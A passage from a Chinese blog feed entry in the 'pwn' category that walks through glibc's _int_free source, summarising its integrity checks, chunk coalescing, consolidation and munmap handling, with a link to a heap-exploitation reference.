class="line">        (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">      systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">       large, because the corresponding heap might go away.  */</span></span><br><span class="line">    heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">    assert(heap-&gt;ar_ptr == av);</span><br><span class="line">    heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      assert (locked);</span><br><span class="line">      (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the chunk was allocated via mmap, release via munmap().</span></span><br><span class="line"><span class="comment">  */</span></span><br></pre></td></tr></table></figure><p>大概流程</p><ul><li>首先做了一些检查， p != top_chunk, p-&gt;size 不能越界， 限制了 next_chunk-&gt;size, p要处于 inuse状态（通过 next_chunk-&gt;pre_inused 判断）</li><li>接着判断 p 的前后相邻块是不是 free 状态，如果是就合并</li><li>根据此次拿到的 unsorted bin 的 大小，如果 size&gt;=FASTBIN_CONSOLIDATION_THRESHOLD 就会触发 malloc_consolidate</li></ul><p>如果 p 是通过 mmap 获得的，就通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">munmap_chunk (p);</span><br></pre></td></tr></table></figure></p><p>释放掉他</p><h2 id="Check-In-Glbc"><a href="#Check-In-Glbc" class="headerlink" title="Check In Glbc"></a>Check In Glbc</h2><p><img alt="" data-src="/imgs/check_free.png" class="lozad"></p><p>来源 <a href="https://github.com/DhavalKapil/heap-exploitation" target="_blank" rel="noopener">https://github.com/DhavalKapil/heap-exploitation</a></p><p><a href="https://heap-exploitation.dhavalkapil.com/author.html" target="_blank" rel="noopener">https://heap-exploitation.dhavalkapil.com/author.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;GI-libc-free&quot;&gt;&lt;a href=&quot;#GI-libc-free&quot; class=&quot;headerlink&quot; title=&quot;_GI___libc_free&quot;&gt;&lt;/a&gt;_GI___libc_free&lt;/h2&gt;&lt;p&gt;首先是 _GI___libc_free&lt;/p&gt;

      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
</feed>
